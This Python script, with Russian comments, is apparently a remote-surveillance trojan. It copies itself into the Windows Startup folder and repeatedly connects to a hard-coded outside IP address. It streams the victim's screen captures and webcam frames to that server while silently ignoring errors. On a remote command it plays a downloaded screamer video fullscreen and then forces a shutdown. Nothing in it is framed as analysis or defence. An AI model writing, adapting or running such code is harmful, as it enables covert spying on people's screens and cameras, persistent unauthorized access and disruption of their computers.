import socket
import pickle
import struct
import threading
import io
import os
import sys
import shutil
from PIL import ImageGrab
import cv2
from moviepy.editor import VideoFileClip
import yt_dlp
from pathlib import Path
import time

def add_to_startup():
    """Добавляет программу в автозагрузку."""
    script_path = Path(sys.argv[0])  # Путь к текущему скрипту
    startup_folder = Path(os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))

    if not (startup_folder / script_path.name).exists():
        shutil.copy(script_path, startup_folder)

def stream_screen_and_camera(client_socket):
    cap = cv2.VideoCapture(0)

    try:
        while True:
            try:
                client_socket.settimeout(1)
                command = client_socket.recv(4096).decode()
                if command == 'PLAY_VIDEO':
                    play_video(r'C:\Games\SCREAMER PARA ASUSTAR A TUS AMIGOS.mp4')
                    continue
            except socket.timeout:
                pass

            screen = ImageGrab.grab()
            screen = screen.resize((640, 480))

            ret, camera_frame = cap.read()
            if not ret:
                break

            with io.BytesIO() as buffer:
                screen.save(buffer, format="JPEG")
                screen_data = buffer.getvalue()

            camera_data = pickle.dumps(camera_frame)

            screen_message_size = struct.pack("!L", len(screen_data))
            client_socket.sendall(screen_message_size + screen_data)

            camera_message_size = struct.pack("!L", len(camera_data))
            client_socket.sendall(camera_message_size + camera_data)

    except Exception:
        pass  # Игнорируем все ошибки
    finally:
        cap.release()
        client_socket.close()

def play_video(video_path):
    def run_video():
        clip = VideoFileClip(video_path)
        clip.preview(fullscreen=True)
        shutdown_computer()  # Выключение компьютера после завершения видео

    video_thread = threading.Thread(target=run_video)
    video_thread.start()
    video_thread.join()  # Ждем завершения воспроизведения видео

def shutdown_computer():
    """Выключает компьютер."""
    if os.name == 'nt':
        os.system("shutdown /s /t 0")
    else:
        os.system("sudo shutdown -h now")

def main():
    # Добавляем программу в автозагрузку
    add_to_startup()

    SERVER_IP = "5.173.152.70"  # Замените на IP сервера
    SERVER_PORT = 5000          # Порт сервера

    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_IP, SERVER_PORT))

            # Запуск потока для стриминга экрана и камеры
            stream_thread = threading.Thread(target=stream_screen_and_camera, args=(client_socket,))
            stream_thread.start()
            stream_thread.join()  # Ждем завершения потока стриминга

        except Exception:
            time.sleep(5)  # Ждем 5 секунд перед перезапуском

def download_video(url, path='.'):
    try:
        ydl_opts = {
            'outtmpl': f'{path}/%(title)s.%(ext)s',
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            ydl.download([url])
    except Exception:
        pass  # Игнорируем ошибки

# Пример использования
video_url = 'https://youtu.be/5p5d1vflc_g'
download_video(video_url, path=r'C:\Games')
os.system("cls")

if __name__ == '__main__':
    main()
